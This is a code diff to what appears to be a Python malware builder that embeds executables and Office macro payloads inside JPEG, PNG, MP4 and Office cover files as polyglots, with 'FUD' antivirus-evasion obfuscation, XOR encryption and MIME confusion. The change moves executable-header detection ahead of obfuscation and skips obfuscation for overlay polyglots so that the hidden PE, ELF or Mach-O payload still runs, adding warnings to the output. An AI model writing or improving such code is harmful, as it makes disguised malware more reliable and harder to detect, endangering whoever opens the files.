@@ -422,6 +422,7 @@ End Function
         original_size = len(payload)
         key = None
         payload_type_used = payload_type
+        warnings_list = []
 
         # Apply payload type wrapping FIRST (before encryption/FUD)
         if payload_type:
@@ -467,14 +468,42 @@ End Function
                     payload = self.office_macro_wrap(payload, 'docx')
                     payload_type_used = 'Word Macro'
 
-        if fud:
-            payload = self.fud_obfuscate(payload)
-        if encrypt:
-            key = os.urandom(32)
-            payload = self.xor_crypt(payload, key)
-        if mime_confuse:
-            ext = os.path.splitext(cover_path)[1]
-            payload = self.mime_confusion(payload, ext)
+        # Detect payload type BEFORE obfuscation (encrypt/FUD/MIME break executables)
+        is_pe = payload[:2] == b'MZ'
+        is_elf = payload[:4] == b'\x7fELF'
+        is_macho = payload[:4] in (b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf',
+                                    b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe')
+        is_executable = is_pe or is_elf or is_macho
+        is_image = container_type.lower() in ('jpeg', 'jpg', 'png', 'gif')
+
+        # Determine if overlay technique will be used (real executable + image)
+        use_overlay = is_executable and is_image and not stealth
+        # Also check if raw payload will be wrapped (raw data + target_os + image)
+        use_wrap = (not is_executable) and is_image and target_os in ('windows', 'linux', 'macos') and not stealth
+        # Payload-type wrappers produce scripts — safe to obfuscate those
+        has_wrapper = payload_type is not None
+
+        # Apply obfuscation — but SKIP for overlay polyglots (real PE/ELF/Mach-O)
+        # because XOR/FUD/MIME corrupt executable headers, import tables, and code
+        if use_overlay and (fud or encrypt or mime_confuse):
+            # Real executable + overlay: obfuscation would corrupt headers/code/import tables
+            skipped = []
+            if fud: skipped.append('FUD')
+            if encrypt: skipped.append('encrypt')
+            if mime_confuse: skipped.append('MIME')
+            fud = encrypt = mime_confuse = False
+            warn = f"Skipped {', '.join(skipped)} — incompatible with overlay polyglot (preserves executable structure)"
+            warnings_list.append(warn)
+            print(f"  ⚠ {warn}")
+        else:
+            if fud:
+                payload = self.fud_obfuscate(payload)
+            if encrypt:
+                key = os.urandom(32)
+                payload = self.xor_crypt(payload, key)
+            if mime_confuse:
+                ext = os.path.splitext(cover_path)[1]
+                payload = self.mime_confusion(payload, ext)
 
         builders = {
             'jpeg': self._b_jpeg, 'jpg': self._b_jpeg,
@@ -483,14 +512,6 @@ End Function
             'mp4': self._b_mp4,
             'xlsx': self._b_zip, 'docx': self._b_zip,  # Office files are ZIP-based
         }
-
-        # Detect payload type for overlay polyglots
-        is_pe = payload[:2] == b'MZ'
-        is_elf = payload[:4] == b'\x7fELF'
-        is_macho = payload[:4] in (b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf',
-                                    b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe')
-        is_executable = is_pe or is_elf or is_macho
-        is_image = container_type.lower() in ('jpeg', 'jpg', 'png', 'gif')
 
         if stealth:
             # Stealth mode: always use image-embedding (valid image, works everywhere)
@@ -539,6 +560,7 @@ End Function
             'fud_protected': fud,
             'mime_confused': mime_confuse,
             'entropy': round(self.entropy(payload), 2),
+            'warnings': warnings_list,
         }
 
     def _b_jpeg(self, c, p):
